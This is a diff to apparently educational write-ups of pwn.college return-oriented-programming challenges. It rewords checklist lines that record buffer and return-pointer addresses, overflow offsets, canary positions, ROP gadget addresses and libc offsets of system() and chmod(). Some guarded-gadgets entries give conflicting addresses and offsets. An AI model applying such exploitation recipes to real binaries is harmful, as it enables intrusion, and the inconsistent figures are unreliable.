@@ -278,7 +278,7 @@ Stack level 0, frame at 0x7ffdb569add0:
 ```
 
 - [x] Location of buffer: `0x7ffdb569ada0`
-- [x] Location of return address to `main()`: `0x7ffdb569adc8`
+- [x] Location of return address: `0x7ffdb569adc8`
 - [x] Offset of instruction in `win()` within the program: `0x4018a6`
 
 ### Exploit
@@ -628,7 +628,7 @@ Stack level 0, frame at 0x7fff0ca86690:
 ```
 
 - [x] Location of buffer: `0x7fff0ca86600`
-- [x] Location of return address to `main()`: `0x7fff0ca86688`
+- [x] Location of return address: `0x7fff0ca86688`
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
 - [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`
 
@@ -1147,7 +1147,7 @@ Stack level 0, frame at 0x7ffd74326e90:
 ```
 
 - [x] Location of buffer: `0x7ffd74326e20`
-- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Location of return address: `0x7ffd74326e88`
 - [ ] Offset of instruction in `win_stage_1()` within the program
 - [ ] Argument expected by `win_stage_1()` 
 - [ ] Offset of instruction in `win_stage_2()` within the program
@@ -1187,7 +1187,7 @@ End of assembler dump.
 ```
 
 - [x] Location of buffer: `0x7ffd74326e20`
-- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Location of return address: `0x7ffd74326e88`
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
 - [x] Argument expected by `win_stage_1()`: `0x1` 
 - [ ] Offset of instruction in `win_stage_2()` within the program
@@ -1225,7 +1225,7 @@ End of assembler dump.
 ```
 
 - [x] Location of buffer: `0x7ffd74326e20`
-- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Location of return address: `0x7ffd74326e88`
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
 - [x] Argument expected by `win_stage_1()`: `0x1` 
 - [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
@@ -1263,7 +1263,7 @@ End of assembler dump.
 ```
 
 - [x] Location of buffer: `0x7ffd74326e20`
-- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Location of return address: `0x7ffd74326e88`
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
 - [x] Argument expected by `win_stage_1()`: `0x1`
 - [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
@@ -1301,7 +1301,7 @@ End of assembler dump.
 ```
 
 - [x] Location of buffer: `0x7ffd74326e20`
-- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Location of return address: `0x7ffd74326e88`
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
 - [x] Argument expected by `win_stage_1()`: `0x1`
 - [x] Offset of instruction in `win_stage_2()` within the program: `0x402079`
@@ -1339,7 +1339,7 @@ End of assembler dump.
 ```
 
 - [x] Location of buffer: `0x7ffd74326e20`
-- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Location of return address: `0x7ffd74326e88`
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
 - [x] Argument expected by `win_stage_1()`: `0x1`
 - [x] Offset of instruction in `win_stage_2()` within the program: `0x402079` 
@@ -1362,7 +1362,7 @@ hacker@return-oriented-programming~chain-of-command-hard:/$ ROPgadget --binary /
 ```
 
 - [x] Location of buffer: `0x7ffd74326e20`
-- [x] Location of return address to `main()`: `0x7ffd74326e88`
+- [x] Location of return address: `0x7ffd74326e88`
 - [x] Offset of instruction in `win_stage_1()` within the program: `0x40223b`
 - [x] Argument expected by `win_stage_1()`: `0x1`
 - [x] Offset of instruction in `win_stage_2()` within the program: `0x402079` 
@@ -1721,7 +1721,7 @@ Stack level 0, frame at 0x7ffd7804ec40:
 ```
 
 - [x] Location of buffer: `0x7ffd7804eba0`
-- [x] Location of stored return address to `main()`: `0x7ffd7804ec38`
+- [x] Location of stored return address: `0x7ffd7804ec38`
 
 Let's get the offset.
 
@@ -2333,7 +2333,7 @@ Stack level 0, frame at 0x7ffeefcd0a90:
 ```
 
 - [x] Location of the buffer: `0x7ffeefcd0a30`
-- [x] location of the stored return pointer to `main()`: `0x7ffeefcd0a88`
+- [x] location of the stored return pointer: `0x7ffeefcd0a88`
 
 Now we can successfully craft.
 
@@ -2736,7 +2736,7 @@ Stack level 0, frame at 0x7ffd2b5e9c30:
 ```
 
 - [x] Location of the buffer: `0x7ffd2b5e9be0` 
-- [x] location of the stored return pointer to `main()`: `0x7ffd2b5e9c28`
+- [x] location of the stored return pointer: `0x7ffd2b5e9c28`
 - [ ] Location of a NULL terminated string
 
 Now, let's look at the ROP gadgets that we have at our disposal.
@@ -2928,7 +2928,7 @@ hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ objdump -s -j .ro
 Out of the various options that we have, let's go with `b"!\x00"` which is at the address `0x403386`.
 
 - [x] Location of the buffer: `0x7ffd2b5e9be0` 
-- [x] location of the stored return pointer to `main()`: `0x7ffd2b5e9c28`
+- [x] location of the stored return pointer: `0x7ffd2b5e9c28`
 - [x] Location of a NULL terminated string: `0x403386`
 
 ### ROP chain: ret2stack
@@ -3349,7 +3349,7 @@ Stack level 0, frame at 0x7ffdc51a0380:
 ```
 
 - [x] Location of the buffer: `0x7ffdc51a0330`
-- [x] location of the stored return pointer to `main()`: `0x7ffdc51a0378`
+- [x] location of the stored return pointer: `0x7ffdc51a0378`
 - [x] Location of a NULL terminated string: `0x403030`
 
 Finally let's take a look at the ROP gadgets.
@@ -3936,9 +3936,9 @@ pwndbg> p/d 0x7ffcd4fe1b38 - 0x7ffcd4fe1ae0
 $1 = 88
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Buffer address: `0x7ffcd4fe1ae0`
-   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
+   - location of the stored return pointer: `0x7ffcd4fe1b38`
 - [ ] Location of a NULL terminated string
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x4011d0`
@@ -3977,9 +3977,9 @@ hacker@return-oriented-programming~indirect-invocation-easy:/$ objdump -s -j .ro
  403380 6f6f6462 79652100                    oodbye!.
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Buffer address: `0x7ffcd4fe1ae0`
-   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
+   - location of the stored return pointer: `0x7ffcd4fe1b38`
 - [x] Location of a NULL terminated string: `0x403386`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x4011d0`
@@ -4027,9 +4027,9 @@ Local exec file:
         0x00000000004050a0 - 0x00000000004050f8 is .bss
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Buffer address: `0x7ffcd4fe1ae0`
-   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
+   - location of the stored return pointer: `0x7ffcd4fe1b38`
 - [x] Location of a NULL terminated string: `0x403386`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x4011d0`
@@ -4783,7 +4783,7 @@ Gadgets information
 Unique gadgets found: 89
 ```
 
-- [ ] Offset between buffer and stored return address to `main()`: `88`
+- [ ] Offset between buffer and stored return address: `88`
 - [ ] Location of a NULL terminated string
 - [ ] Locations of required PLT stubs
 - [x] Locations of required ROP gadgets
@@ -4825,7 +4825,7 @@ Non-debugging symbols:
 0x0000000000401d78  _fini
 ```
 
-- [ ] Offset between buffer and stored return address to `main()`: `88`
+- [ ] Offset between buffer and stored return address: `88`
 - [ ] Location of a NULL terminated string
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x401100`
@@ -4951,9 +4951,9 @@ pwndbg> p/d 0x7ffd745d5fc8 - 0x7ffd745d5f90
 $1: 56
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `56`
+- [x] Offset between buffer and stored return address: `56`
    - Buffer address: `0x7ffd745d5f90`
-   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
+   - location of the stored return pointer: `0x7ffd745d5fc8`
 - [ ] Location of a NULL terminated string
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x401100`
@@ -4973,9 +4973,9 @@ hacker@return-oriented-programming~indirect-invocation-hard:/$ objdump -s -j .ro
  402030 2100                                 !.   
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `56`
+- [x] Offset between buffer and stored return address: `56`
    - Buffer address: `0x7ffd745d5f90`
-   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
+   - location of the stored return pointer: `0x7ffd745d5fc8`
 - [x] Location of a NULL terminated string: `0x402030`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x401100`
@@ -5023,9 +5023,9 @@ Local exec file:
         0x0000000000404060 - 0x0000000000404080 is .bss
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `56`
+- [x] Offset between buffer and stored return address: `56`
    - Buffer address: `0x7ffd745d5f90`
-   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
+   - location of the stored return pointer: `0x7ffd745d5fc8`
 - [x] Location of a NULL terminated string: `0x402030`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x401100`
@@ -5505,9 +5505,9 @@ pwndbg> p/d 0x7ffd64369f38 - 0x7ffd64369ec0
 $1: 120
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `120`
+- [x] Offset between buffer and stored return address: `120`
    - Location of the buffer: `0x7ffd64369ec0`
-   - location of the stored return pointer to `main()`: `0x7ffd64369f38`
+   - location of the stored return pointer: `0x7ffd64369f38`
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -5549,9 +5549,9 @@ hacker@return-oriented-programming~leaky-libc-easy:/$ objdump -s -j .rodata /cha
  4024b0 6f6f6462 79652100                    oodbye!.  
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `120`
+- [x] Offset between buffer and stored return address: `120`
    - Location of the buffer: `0x7ffd64369ec0`
-   - location of the stored return pointer to `main()`: `0x7ffd64369f38`
+   - location of the stored return pointer: `0x7ffd64369f38`
 - [x] Location of a NULL terminated string: `0x402491`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6078,7 +6078,7 @@ Stack level 0, frame at 0x7ffd039a0900:
 
 - [ ] Offset between buffer and stored return address to `main()`
    - Location of the buffer: `0x7ffd039a08b0`
-   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
+   - location of the stored return pointer: `0x7ffd039a08f8`
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6094,9 +6094,9 @@ pwndbg> p/d 0x7ffd039a08f8 - 0x7ffd039a08b0
 $1: 72
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffd039a08b0`
-   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
+   - location of the stored return pointer: `0x7ffd039a08f8`
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6114,9 +6114,9 @@ hacker@return-oriented-programming~leaky-libc-hard:/$ objdump -s -j .rodata /cha
  403060 0a002323 2320476f 6f646279 652100    ..### Goodbye!. 
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffd039a08b0`
-   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
+   - location of the stored return pointer: `0x7ffd039a08f8`
 - [x] Location of a NULL terminated string: `0x40306d`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6476,9 +6476,9 @@ pwndbg> p/d 0x7fff7f3afc58 - 0x7fff7f3afc20
 $1: 56
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `56`
+- [x] Offset between buffer and stored return address: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [ ] Location of a NULL terminated string
@@ -6522,9 +6522,9 @@ hacker@return-oriented-programming~putsception-easy:/$ objdump -s -j .rodata /ch
  403600 6f6f6462 79652100                    oodbye!.  
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `56`
+- [x] Offset between buffer and stored return address: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [x] Location of a NULL terminated string: `0x403606`
@@ -6678,9 +6678,9 @@ Gadgets information
 Unique gadgets found: 136
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `56`
+- [x] Offset between buffer and stored return address: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [x] Location of a NULL terminated string: `0x403606`
@@ -6711,9 +6711,9 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-li
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `56`
+- [x] Offset between buffer and stored return address: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [x] Location of a NULL terminated string: `0x403606`
@@ -7360,9 +7360,9 @@ pwndbg> p/d 0x7fff1ca542d8 - 0x7fff1ca54290
 $1: 72
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [ ] Location of a NULL terminated string
@@ -7378,9 +7378,9 @@ hacker@return-oriented-programming~putsception-hard:/$ objdump -s -j .rodata /ch
  403030 2100                                 !.  
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [x] Location of a NULL terminated string: `0x403030`
@@ -7476,9 +7476,9 @@ Gadgets information
 Unique gadgets found: 78
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [x] Location of a NULL terminated string: `0x403030`
@@ -7509,9 +7509,9 @@ hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-li
   2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
 ```
 
-- [x] Offset between buffer and stored return address to `main()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [x] Location of a NULL terminated string: `0x403030`
@@ -9315,9 +9315,9 @@ pwndbg> p/d 0x7fff122d4e78 - 0x7fff122d4e08
 $1 = 112
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
    - Location of the buffer: `0x7fff122d4e08`
-   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
+   - Location of stored return pointer: `0x7fff122d4e78`
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -9368,9 +9368,9 @@ So, if we use the `leave ; ret` gadget present in `main()` we will only have to 
 
 This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
    - Location of the buffer: `0x7fff122d4e08`
-   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
+   - Location of stored return pointer: `0x7fff122d4e78`
 - [x] LSB of required ROP gadgets:
    - `leave ; ret`: `\xb2`
 - [ ] Offset of the overwritten stored base pointer value from the buffer
@@ -9378,9 +9378,9 @@ This is because the address are always `0x1000` aligned. So, if we went with the
 Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`.
 We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16. This will be clear when looking at the ROP chain.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `112`
    - Location of the buffer: `0x7fff122d4e08`
-   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
+   - Location of stored return pointer: `0x7fff122d4e78`
 - [x] LSB of required ROP gadgets:
    - `leave ; ret`: `\xb2`
 - [x] Offset of the overwritten stored base pointer value from the buffer: `0x7fff122d4e70 - 16`
@@ -9745,9 +9745,9 @@ pwndbg> p/d 0x7ffe74b2f678 - 0x7ffe74b2f618
 $1 = 96
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `96`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `96`
    - Location of the buffer: `0x7ffe74b2f618`
-   - Location of the stored return pointer to `main()`: `0x7ffe74b2f678`
+   - Location of the stored return pointer: `0x7ffe74b2f678`
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -9798,18 +9798,18 @@ This is because the address are always `0x1000` aligned. So, if we went with the
 
 We have the following information now:
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `96`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `96`
    - Location of the buffer: `0x7ffe74b2f618`
-   - Location of the stored return pointer to `main()`: `0x7ffe74b2f678`
+   - Location of the stored return pointer: `0x7ffe74b2f678`
 - [x] Locations of required ROP gadgets
    - `leave ; ret`: `\x47`
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`. We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `96`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `96`
    - Location of the buffer: `0x7ffe74b2f618`
-   - Location of the stored return pointer to `main()`: `0x7ffe74b2f678`
+   - Location of the stored return pointer: `0x7ffe74b2f678`
 - [x] Locations of required ROP gadgets
    - `leave ; ret`: `\x47`
 - [x] Offset of the overwritten stored base pointer value from the buffer: `0x7ffe74b2f670 - 16`
@@ -10153,9 +10153,9 @@ pwndbg> p/d 0x7ffe4e08de88 - 0x7ffe4e08de08
 $1 = 128
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `128`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `128`
    - Location of the buffer: `0x7ffe4e08de08`
-   - Location of stored return pointer to `main()`: `0x7ffe4e08de88`
+   - Location of stored return pointer: `0x7ffe4e08de88`
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -10206,9 +10206,9 @@ So, if we use the `leave ; ret` gadget present in `main()` we will only have to 
 
 This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `128`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `128`
    - Location of the buffer: `0x7ffe4e08de08`
-   - Location of stored return pointer to `main()`: `0x7ffe4e08de88`
+   - Location of stored return pointer: `0x7ffe4e08de88`
 - [x] LSB of required ROP gadgets:
    - `leave ; ret`: `\x86`
 - [ ] Offset of the overwritten stored base pointer value from the buffer
@@ -10217,9 +10217,9 @@ Finally we also need to define the value with which we will overwrite the stored
 We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16. `0x7ffe4e08ddf8` is the value being popped into `rbp`, and after `pop rbp`, `rsp` advances to `de00` where `win()` lives.
 This will be clear when looking at the ROP chain.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `128`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `128`
    - Location of the buffer: `0x7ffe4e08de08`
-   - Location of stored return pointer to `main()`: `0x7ffe4e08de88`
+   - Location of stored return pointer: `0x7ffe4e08de88`
 - [x] LSB of required ROP gadgets:
    - `leave ; ret`: `\x86`
 - [x] Offset of the overwritten stored base pointer value from the buffer: `0x7ffe4e08de80 - 16`
@@ -10580,9 +10580,9 @@ pwndbg> p/d 0x7ffcacefda88 - 0x7ffcacefda58
 $1 = 48
 ```
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `48`
    - Location of the buffer: `0x7ffcacefda58`
-   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
+   - Location of the stored return pointer: `0x7ffcacefda88`
 - [ ] Locations of required ROP gadgets
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
@@ -10633,18 +10633,18 @@ This is because the address are always `0x1000` aligned. See [here](https://writ
 
 We have the following information now:
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `48`
    - Location of the buffer: `0x7ffcacefda58`
-   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
+   - Location of the stored return pointer: `0x7ffcacefda88`
 - [x] Locations of required ROP gadgets
    - `leave ; ret`: `\xbb`
 - [ ] Offset of the overwritten stored base pointer value from the buffer
 
 Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`. We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16.
 
-- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `48`
+- [x] Offset between the location of the buffer and the location of the stored return pointer: `48`
    - Location of the buffer: `0x7ffcacefda58`
-   - Location of the stored return pointer to `main()`: `0x7ffcacefda88`
+   - Location of the stored return pointer: `0x7ffcacefda88`
 - [x] Locations of required ROP gadgets
    - `leave ; ret`: `\xbb`
 - [x] Offset of the overwritten stored base pointer value from the buffer: `0x7ffcacefda80 - 16`
@@ -12036,9 +12036,9 @@ $2 = 88
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+   - Location of the stored return address: `0x7ffe0e9228f8`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12062,9 +12062,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /l
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+   - Location of the stored return address: `0x7ffe0e9228f8`
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
    - `pop rdi ; ret`: `0x23b6a`
@@ -12082,9 +12082,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+   - Location of the stored return address: `0x7ffe0e9228f8`
 - [ ] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
 - [x] Locations of required ROP gadgets
@@ -12104,9 +12104,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffe0e9228e8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffe0e9228f8`
+   - Location of the stored return address: `0x7ffe0e9228f8`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
    - Offset of `chmod()` within Libc: `0x10dd80`
@@ -12655,9 +12655,9 @@ $2 = 136
 - [x] Offset between buffer and stack canary: `120`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffcf1340cf0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address to `main()`: `136`
+- [x] Offset between buffer and stored return address: `136`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+   - Location of the stored return address: `0x7ffcf1340cf8`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -12681,9 +12681,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ ROPgadget --binary /l
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+   - Location of the stored return address: `0x7ffcf1340cf8`
 - [ ] Offsets of required Libc functions
 - [x] Locations of required ROP gadgets
    - `pop rdi ; ret`: `0x23b6a`
@@ -12701,9 +12701,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+   - Location of the stored return address: `0x7ffcf1340cf8`
 - [ ] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
 - [x] Locations of required ROP gadgets
@@ -12723,9 +12723,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+   - Location of the stored return address: `0x7ffcf1340cf8`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
    - Offset of `chmod()` within Libc: `0x10dd80`
@@ -12736,9 +12736,9 @@ hacker@return-oriented-programming~guarded-gadgets-easy:~$ readelf -s /lib/x86_6
 - [x] Offset between buffer and stack canary: `72`
    - Location of the buffer: `0x7ffe0e9228a0`
    - Location of the canary: `0x7ffe0e9228f0 - 8` = `0x7ffcf1340ce8`
-- [x] Offset between buffer and stored return address to `main()`: `88`
+- [x] Offset between buffer and stored return address: `88`
    - Location of the buffer: `0x7ffe0e9228a0`
-   - Location of the stored return address to `main()`: `0x7ffcf1340cf8`
+   - Location of the stored return address: `0x7ffcf1340cf8`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
    - Offset of `chmod()` within Libc: `0x10dd80`
@@ -12921,6 +12921,7 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ /challenge/rop-roulette-
